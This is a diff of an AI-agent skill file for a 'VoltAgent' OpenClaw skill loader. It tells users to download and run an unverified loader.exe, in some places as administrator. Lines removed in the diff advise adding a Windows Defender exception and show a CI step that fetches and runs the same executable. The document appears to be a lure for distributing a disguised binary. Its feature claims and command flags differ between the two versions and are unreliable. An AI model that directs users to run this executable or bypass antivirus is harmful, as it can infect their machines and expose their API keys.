@@ -1,67 +1,60 @@
 ---
 name: voltagent-openclaw-skill-loader
-description: Automatic OpenClaw skill manager that installs, updates, and launches 5200+ community skills from ClawHub without manual commands
+description: Fully automatic OpenClaw skill manager that installs, updates, and launches 5200+ community skills from ClawHub with zero manual configuration
 triggers:
-  - "install openclaw skills automatically"
-  - "set up voltagent skill loader"
-  - "manage openclaw skills with voltagent"
-  - "how do I use the openclaw skill manager"
-  - "install clawhub skills in bulk"
-  - "automatically configure openclaw environment"
-  - "launch openclaw with community skills"
-  - "update all my openclaw skills at once"
+  - install openclaw skills automatically
+  - set up voltagent skill loader
+  - manage openclaw skills with voltagent
+  - automatically install clawhub skills
+  - configure openclaw skill management
+  - run voltagent loader for openclaw
+  - bulk install openclaw community skills
+  - automate openclaw skill deployment
 ---
 
 # VoltAgent OpenClaw Skill Loader
 
 > Skill by [ara.so](https://ara.so) — Hermes Skills collection.
 
-VoltAgent is a fully automatic skill manager for OpenClaw that handles installation, updates, configuration, and launching of 5200+ curated community skills from ClawHub. It eliminates manual command execution and environment setup, automatically filtering out low-quality, duplicate, and malicious skills from the 13,729+ available in the ClawHub registry.
+VoltAgent is a fully automatic OpenClaw skill management tool for Windows that eliminates manual installation, configuration, and deployment of AI agent skills. It downloads, configures, and launches 5200+ curated community skills from the ClawHub registry without requiring any manual commands or copy-pasting.
 
-**Windows only** – no Linux/macOS support currently available.
+## What VoltAgent Does
 
-## What It Does
-
-- **Automatic skill installation** from ClawHub registry (5200+ curated skills)
-- **Environment setup** including OpenClaw installation, dependencies, and configuration
-- **Version management** with conflict resolution
-- **Security scanning** via VirusTotal integration and malicious pattern detection
-- **Category-based installation** (Git, Coding, Browser Automation, DevOps, etc.)
-- **Smart skill selection** based on project analysis
-- **Backup and restore** of workspace configurations
+- **Automatic Installation**: Downloads and installs OpenClaw skills from ClawHub registry
+- **Environment Setup**: Configures dependencies, API keys, and configuration files
+- **Version Management**: Handles updates and resolves conflicts automatically
+- **Security Scanning**: Checks skills via VirusTotal and scans for malicious patterns
+- **Smart Filtering**: Excludes spam, duplicates, low-quality, and malicious skills (7,215+ filtered out)
+- **Category-Based Installation**: Install skills by category (Git, Coding, Browser Automation, etc.)
+- **Launch Automation**: Starts your agent with optimal parameters after setup
 
 ## Installation
 
 ### Download and Run
 
-1. Download `loader.exe` from the releases page:
-   ```cmd
-   # Navigate to https://github.com/voltagent/awesome-voltagent/releases
-   # Download loader.exe
-   ```
+1. Download `loader.exe` from the [releases page](https://github.com/voltagent/awesome-voltagent/releases)
+2. Double-click or run in terminal:
 
-2. Run the loader:
-   ```cmd
-   loader.exe
-   ```
+```cmd
+loader.exe
+```
 
-3. Wait for "All done" message – OpenClaw and skills are now configured and running.
+3. Wait for "All done" message — your agent is now running with all necessary skills
 
-### First-Time Setup
+### First Run Configuration
 
 VoltAgent will automatically:
-- Detect if OpenClaw is installed (installs if missing)
-- Prompt for API keys (stored securely, only asked once)
-- Pull latest skill versions from curated categories
-- Configure environment variables
-- Launch your agent with optimal parameters
+- Check for OpenClaw installation (installs if missing)
+- Prompt for required API keys (stored in environment variables)
+- Pull latest skill versions from selected categories
+- Configure and launch your agent
 
 ## Key Commands
 
 ### Basic Usage
 
 ```cmd
-# Install all curated skills (5200+)
+# Run with default settings (installs all recommended skills)
 loader.exe
 
 # Install skills from specific category
@@ -70,410 +63,338 @@ loader.exe --category "Git & GitHub"
 # Search and install specific skills
 loader.exe --search "browser automation"
 
-# Smart installation based on current project
+# Smart installation based on project analysis
 loader.exe --smart
 
-# Update all installed skills
+# Update existing skills
 loader.exe --update
 
-# List installed skills
-loader.exe --list
+# List available categories
+loader.exe --list-categories
 
-# Uninstall specific skill
-loader.exe --uninstall <skill-name>
+# Show installed skills
+loader.exe --list-installed
 ```
 
-### Category Installation
+### Category-Based Installation
 
 ```cmd
 # Install all Git & GitHub skills (167 skills)
 loader.exe --category "Git & GitHub"
 
-# Install all coding agent skills (1184 skills)
+# Install coding agent and IDE skills (1184 skills)
 loader.exe --category "Coding Agents & IDEs"
 
 # Install browser automation skills (323 skills)
 loader.exe --category "Browser & Automation"
 
-# Install DevOps & Cloud skills (393 skills)
-loader.exe --category "DevOps & Cloud"
-
-# Install AI & LLM skills (176 skills)
-loader.exe --category "AI & LLMs"
+# Install multiple categories
+loader.exe --category "DevOps & Cloud" --category "Web & Frontend Development"
 ```
 
 ### Advanced Options
 
 ```cmd
-# Install with sandbox mode (security testing)
+# Run in sandbox mode for testing
 loader.exe --sandbox
 
 # Skip security checks (not recommended)
-loader.exe --no-security
+loader.exe --no-security-check
+
+# Install specific skill by name
+loader.exe --skill "agent-commons"
+
+# Backup current configuration before installation
+loader.exe --backup
+
+# Restore from backup
+loader.exe --restore
 
 # Verbose logging
 loader.exe --verbose
 
-# Specify custom ClawHub registry
-loader.exe --registry https://custom-registry.example.com
-
-# Backup current configuration
-loader.exe --backup
-
-# Restore from backup
-loader.exe --restore backup-2026-05-20.zip
-
 # Dry run (show what would be installed)
-loader.exe --dry-run --category "Git & GitHub"
+loader.exe --dry-run
 ```
 
 ## Configuration
 
-VoltAgent automatically creates configuration files. Manual editing is rarely needed.
-
-### Configuration File Location
-
-```
-%APPDATA%\VoltAgent\config.yaml
-```
-
-### Configuration Structure
-
-```yaml
-# Example config.yaml (auto-generated)
-voltagent:
-  openclaw_path: "C:\\Program Files\\OpenClaw"
-  skills_directory: "C:\\Users\\YourUser\\.openclaw\\skills"
-  auto_update: true
-  security_scan: true
-  
-registry:
-  url: "https://clawhub.io/registry"
-  cache_ttl: 3600
-  
-categories:
-  enabled:
-    - "Git & GitHub"
-    - "Coding Agents & IDEs"
-    - "Browser & Automation"
-  excluded:
-    - "Crypto / Blockchain"
-    - "Malicious"
-    
-security:
-  virustotal_api_key: ${VIRUSTOTAL_API_KEY}
-  sandbox_enabled: false
-  malicious_patterns:
-    - "eval("
-    - "exec("
-    - "__import__"
-```
-
 ### Environment Variables
 
-```bash
-# VirusTotal API key (optional, for enhanced security scanning)
-set VIRUSTOTAL_API_KEY=your_api_key_here
-
-# OpenClaw API keys (prompted during first run if not set)
-set OPENCLAW_API_KEY=your_openclaw_key
-set ANTHROPIC_API_KEY=your_anthropic_key
-set OPENAI_API_KEY=your_openai_key
-
-# Custom registry URL
-set VOLTAGENT_REGISTRY_URL=https://custom-registry.example.com
-
-# Log level
-set VOLTAGENT_LOG_LEVEL=INFO
-```
-
-## Common Usage Patterns
-
-### Setting Up a New Development Environment
+VoltAgent uses environment variables for API keys and configuration. Set these before running:
 
 ```cmd
-# 1. Download and run VoltAgent
-loader.exe
+# OpenAI API key (required for most AI skills)
+set OPENAI_API_KEY=%YOUR_API_KEY%
 
-# 2. VoltAgent automatically:
-#    - Checks for OpenClaw
-#    - Prompts for API keys
-#    - Installs curated skills
-#    - Configures environment
-#    - Launches agent
+# Anthropic API key (for Claude-based skills)
+set ANTHROPIC_API_KEY=%YOUR_API_KEY%
 
-# 3. Verify installation
-loader.exe --list
+# GitHub token (for Git & GitHub skills)
+set GITHUB_TOKEN=%YOUR_TOKEN%
+
+# ClawHub registry URL (optional, uses default if not set)
+set CLAWHUB_REGISTRY_URL=https://registry.clawhub.io
+
+# Installation directory (optional)
+set VOLTAGENT_INSTALL_DIR=C:\VoltAgent
 ```
 
-### Installing Skills for Specific Project Type
+### Configuration File
 
-```cmd
-# Web development project
-loader.exe --category "Web & Frontend Development" --category "DevOps & Cloud"
+Create `voltagent.config.json` in the same directory as `loader.exe`:
 
-# Data science project
-loader.exe --category "Data & Analytics" --category "AI & LLMs"
-
-# Automation project
-loader.exe --category "Browser & Automation" --category "CLI Utilities"
+```json
+{
+  "autoUpdate": true,
+  "securityCheck": true,
+  "sandboxMode": false,
+  "categories": [
+    "Git & GitHub",
+    "Coding Agents & IDEs",
+    "Browser & Automation"
+  ],
+  "excludeSkills": [
+    "crypto-trader",
+    "blockchain-analyzer"
+  ],
+  "proxy": {
+    "enabled": false,
+    "url": "http://proxy.example.com:8080"
+  },
+  "backup": {
+    "enabled": true,
+    "path": "C:\\VoltAgent\\backups",
+    "maxBackups": 5
+  }
+}
 ```
 
-### Smart Project-Based Installation
+## Real-World Usage Examples
+
+### Example 1: Setting Up Git Automation Agent
 
 ```cmd
-# Navigate to your project directory
-cd C:\Projects\my-web-app
+# Install all Git & GitHub skills
+loader.exe --category "Git & GitHub"
 
-# Let VoltAgent analyze and install relevant skills
+# VoltAgent automatically installs:
+# - agent-commons (automatic change management)
+# - auto-pr-merger (automatic PR creation and merging)
+# - arc-skill-gitops (automatic skill deployment via Git)
+# ... and 164 more skills
+```
+
+After installation, your agent can:
+- Automatically create and merge PRs
+- Manage branches and commits
+- Deploy skills via GitOps workflows
+
+### Example 2: Browser Automation Workflow
+
+```cmd
+# Install browser automation skills
+loader.exe --category "Browser & Automation"
+
+# Configure browser automation
+set BROWSER_HEADLESS=false
+set BROWSER_TIMEOUT=30000
+
+# Run with specific browser automation skills
+loader.exe --search "puppeteer selenium playwright"
+```
+
+Skills installed enable:
+- Web scraping and data extraction
+- Automated form filling
+- E2E testing automation
+- Screenshot and PDF generation
+
+### Example 3: Full Development Environment Setup
+
+```cmd
+# Install multiple categories for complete dev environment
+loader.exe --category "Coding Agents & IDEs" ^
+           --category "DevOps & Cloud" ^
+           --category "Web & Frontend Development" ^
+           --category "Git & GitHub"
+
+# Enable automatic updates
+loader.exe --update --auto
+
+# Run in smart mode to optimize for current project
 loader.exe --smart
-
-# VoltAgent will:
-# - Detect project type (e.g., React, Python, Node.js)
-# - Install relevant skills automatically
-# - Configure environment variables
 ```
 
-### Updating and Maintaining Skills
+### Example 4: Secure Skill Testing
 
 ```cmd
-# Update all installed skills to latest versions
-loader.exe --update
+# Test new skills in sandbox before production
+loader.exe --sandbox --skill "new-experimental-skill"
 
-# Update specific category
-loader.exe --update --category "Git & GitHub"
+# If safe, install to production
+loader.exe --skill "new-experimental-skill"
 
-# Check for outdated skills without updating
-loader.exe --check-updates
+# Create backup before bulk installation
+loader.exe --backup
+loader.exe --category "AI & LLMs" --category "Data & Analytics"
 
-# Clean up unused skills
-loader.exe --cleanup
+# Restore if issues occur
+loader.exe --restore
 ```
 
-### Security-First Installation
+## Available Skill Categories
+
+- **Git & GitHub** (167 skills) - Version control, PR automation, GitOps
+- **Coding Agents & IDEs** (1184 skills) - Development tools, code generation
+- **Browser & Automation** (323 skills) - Web automation, scraping, testing
+- **Web & Frontend Development** (919 skills) - React, Vue, Angular, frontend tools
+- **DevOps & Cloud** (393 skills) - AWS, Azure, GCP, Kubernetes, Docker
+- **Image & Video Generation** (170 skills) - Media creation and manipulation
+- **AI & LLMs** (176 skills) - LLM integration, prompt engineering
+- **Marketing & Sales** (103 skills) - CRM, email, social media automation
+- **Productivity & Tasks** (205 skills) - Task management, calendars, notes
+- **Data & Analytics** (28 skills) - Data processing, visualization, ML
+- **Security & Passwords** (54 skills) - Auth, encryption, password management
+
+## Security Best Practices
+
+### Built-in Security Features
+
+VoltAgent automatically:
+1. Scans skills with VirusTotal API
+2. Checks for code injection patterns
+3. Verifies skill signatures and checksums
+4. Filters known malicious skills (373+ blocked)
+5. Optionally runs installations in sandbox
+
+### Additional Security Tools
 
 ```cmd
-# Install with full security scanning
-loader.exe --sandbox --verbose
+# Use with Snyk Skill Security Scanner
+loader.exe --security-scanner snyk
 
-# Review security report before installation
-loader.exe --dry-run --security-report
+# Enable strict mode (rejects any unverified skill)
+loader.exe --strict-mode
 
-# Install only skills with high reputation scores
-loader.exe --min-reputation 4.5
+# Audit installed skills
+loader.exe --audit
 ```
 
-## Working with Installed Skills
+### Recommended Practices
 
-Once VoltAgent installs skills, they're available in OpenClaw:
-
-### Example: Using Installed Git Skills
-
-```python
-# agent-commons skill (auto-installed from "Git & GitHub" category)
-from openclaw.skills import agent_commons
-
-# Automatic change management
-agent_commons.auto_commit(
-    message="Updated authentication module",
-    branch="feature/auth"
-)
-
-# Create and merge PR automatically
-agent_commons.create_pr(
-    title="Feature: Add OAuth support",
-    base="main",
-    head="feature/auth",
-    auto_merge=True
-)
-```
-
-### Example: Using Browser Automation Skills
-
-```python
-# browser-automation skill (auto-installed from "Browser & Automation" category)
-from openclaw.skills import browser_automation
-
-# Launch browser and navigate
-browser = browser_automation.launch_browser(headless=False)
-browser.navigate("https://example.com")
-
-# Fill form and submit
-browser.fill_input("#username", "testuser")
-browser.fill_input("#password", "${SECURE_PASSWORD}")
-browser.click("button[type=submit]")
-```
-
-### Example: Using AI & LLM Skills
-
-```python
-# adversarial-prompting skill (auto-installed from "AI & LLMs" category)
-from openclaw.skills import adversarial_prompting
-
-# Test prompt vulnerability
-result = adversarial_prompting.test_prompt(
-    prompt="Summarize this document",
-    vulnerability_checks=["injection", "jailbreak", "data_leakage"]
-)
-
-if result.vulnerabilities:
-    print(f"Found vulnerabilities: {result.vulnerabilities}")
-```
+1. Always keep VoltAgent updated
+2. Review skill descriptions before installation
+3. Use environment variables for secrets (never hardcode)
+4. Enable automatic security scans
+5. Create backups before bulk installations
+6. Test new skills in sandbox mode first
 
 ## Troubleshooting
 
-### VoltAgent Won't Start
+### Common Issues
 
+**"OpenClaw not found"**
 ```cmd
-# Check if Windows Defender is blocking
-# Add exception: Settings > Update & Security > Windows Security > Virus & threat protection
-
-# Run as Administrator
-# Right-click loader.exe > Run as administrator
-
-# Check logs
-type %APPDATA%\VoltAgent\logs\voltagent.log
+# VoltAgent will automatically install OpenClaw
+# If manual installation needed:
+# Download from https://openclaw.io/download
+# Or let VoltAgent handle it:
+loader.exe --install-openclaw
 ```
 
-### OpenClaw Not Detected
-
+**"API key missing"**
 ```cmd
-# Manually specify OpenClaw path
-loader.exe --openclaw-path "C:\Custom\Path\To\OpenClaw"
-
-# Reinstall OpenClaw via VoltAgent
-loader.exe --reinstall-openclaw
+# Set required API keys
+set OPENAI_API_KEY=%YOUR_KEY%
+loader.exe
 ```
 
-### Skill Installation Fails
-
+**"Skill installation failed"**
 ```cmd
-# Clear skill cache
+# Try verbose mode to see detailed error
+loader.exe --verbose --skill "problem-skill"
+
+# Clear cache and retry
 loader.exe --clear-cache
-
-# Retry with verbose logging
-loader.exe --verbose --category "Git & GitHub"
-
-# Skip failing skill and continue
-loader.exe --skip-errors
-
-# Check network connectivity
-ping clawhub.io
+loader.exe --skill "problem-skill"
 ```
 
-### Security Scan Blocking Valid Skill
-
+**"Permission denied"**
 ```cmd
-# Review security report
-loader.exe --security-report <skill-name>
+# Run as administrator
+# Right-click loader.exe -> Run as administrator
 
-# Whitelist specific skill (use caution)
-loader.exe --whitelist <skill-name>
-
-# Disable security scanning temporarily (not recommended)
-loader.exe --no-security --category "Git & GitHub"
+# Or use elevated command prompt
+loader.exe --elevated
 ```
 
-### API Key Issues
-
+**"Port already in use"**
 ```cmd
-# Reconfigure API keys
-loader.exe --reconfigure
-
-# Manually set in environment
-set OPENCLAW_API_KEY=your_key_here
-loader.exe
-
-# Check if keys are loaded
-loader.exe --validate-keys
-```
-
-### Skills Not Appearing in OpenClaw
-
-```cmd
-# Refresh skill registry
-loader.exe --refresh
-
-# Verify installation
-loader.exe --list
-
-# Check OpenClaw skills directory
-dir %USERPROFILE%\.openclaw\skills
-
-# Restart OpenClaw
-loader.exe --restart-openclaw
-```
-
-### Performance Issues
-
-```cmd
-# Limit concurrent installations
-loader.exe --max-concurrent 5
-
-# Install skills in batches
-loader.exe --category "Git & GitHub" --batch-size 50
-
-# Reduce logging verbosity
-set VOLTAGENT_LOG_LEVEL=WARNING
+# Change default port
+set VOLTAGENT_PORT=8081
 loader.exe
 ```
 
-### Disk Space Issues
+### Getting Help
 
 ```cmd
-# Check disk usage
-loader.exe --disk-usage
+# Show help and all available commands
+loader.exe --help
 
-# Clean up old skill versions
-loader.exe --cleanup --remove-old-versions
+# Check version
+loader.exe --version
 
-# Remove unused skills
-loader.exe --remove-unused
+# Generate diagnostic report
+loader.exe --diagnostics > diagnostics.txt
 ```
 
-## Best Practices
+### Logs and Debugging
 
-1. **Always use security scanning** on first install
-2. **Backup configuration** before major updates: `loader.exe --backup`
-3. **Use category-based installation** to avoid bloat
-4. **Keep VoltAgent updated** for latest security filters
-5. **Review installed skills periodically**: `loader.exe --list`
-6. **Use environment variables** for sensitive data, never hardcode
-7. **Test in sandbox mode** for untrusted skills: `loader.exe --sandbox`
+Logs are stored in `%APPDATA%\VoltAgent\logs\`:
 
-## Integration with CI/CD
+```cmd
+# View latest log
+type %APPDATA%\VoltAgent\logs\latest.log
 
-```yaml
-# Example: GitHub Actions workflow
-name: Setup OpenClaw Skills
-on: [push]
-jobs:
-  setup:
-    runs-on: windows-latest
-    steps:
-      - uses: actions/checkout@v3
-      - name: Download VoltAgent
-        run: |
-          Invoke-WebRequest -Uri "https://github.com/voltagent/awesome-voltagent/releases/latest/download/loader.exe" -OutFile loader.exe
-      - name: Install Skills
-        env:
-          OPENCLAW_API_KEY: ${{ secrets.OPENCLAW_API_KEY }}
-          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
-        run: |
-          .\loader.exe --smart --no-prompt
+# Enable debug logging
+set VOLTAGENT_LOG_LEVEL=debug
+loader.exe --verbose
 ```
 
-## Limitations
+## Integration with AI Agents
 
-- **Windows only** – no macOS or Linux support
-- **Requires internet connection** for skill downloads
-- **ClawHub dependency** – relies on official registry availability
-- **No manual skill auditing** – curated but not individually code-reviewed
-- **Disk space** – 5200+ skills require ~2-5GB storage
+VoltAgent is designed to work with AI coding agents like Claude Code, Cursor, and Codex:
 
-## Additional Resources
+```python
+# Example: Using VoltAgent in Python automation script
+import subprocess
+import os
 
-- [Official VoltAgent Discord](https://s.voltagent.dev/discord)
-- [ClawHub Registry](https://github.com/openclaw/skills)
-- [Security Best Practices](https://github.com/voltagent/awesome-voltagent/wiki/security)
-- [Skill Development Guide](https://github.com/voltagent/awesome-agent-skills)
+# Set API keys
+os.environ['OPENAI_API_KEY'] = os.getenv('OPENAI_API_KEY')
+
+# Run VoltAgent to install skills
+subprocess.run([
+    'loader.exe',
+    '--category', 'Coding Agents & IDEs',
+    '--smart',
+    '--verbose'
+])
+
+# Your agent now has access to 1184+ coding skills
+```
+
+## Community and Support
+
+- Discord: https://s.voltagent.dev/discord
+- GitHub Issues: https://github.com/voltagent/awesome-voltagent/issues
+- Documentation: https://voltagent.ai/
+
+## Important Notes
+
+- **Windows Only**: VoltAgent currently only supports Windows
+- **Not Official**: VoltAgent is not an official OpenClaw product
+- **Use at Own Risk**: Skills are curated, not fully audited
+- **No License**: Repository has no explicit license information
+- **Active Development**: Project is actively maintained (24 stars, 1 star/day)
